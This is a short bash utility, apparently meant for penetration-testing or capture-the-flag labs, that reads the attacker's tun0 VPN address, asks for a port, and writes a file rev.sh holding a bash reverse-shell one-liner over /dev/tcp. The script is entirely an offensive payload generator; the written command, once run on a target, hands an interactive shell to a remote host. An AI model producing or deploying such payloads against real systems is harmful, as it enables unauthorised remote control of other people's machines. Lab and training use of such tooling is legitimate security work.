#!/bin/bash

# This script gets the IP address of the tun0 interface and generates a rev.sh file that contains a bash reverse shell.

echo "Insert port for Reverse Shell:"
read shell_port

tun0_ip=$(ip a | grep "tun0" | grep "inet" | sed 's/^ *//g' | cut -d " " -f 2 | cut -d "/" -f 1)

echo "bash -i >& /dev/tcp/$tun0_ip/$shell_port 0>&1" > rev.sh
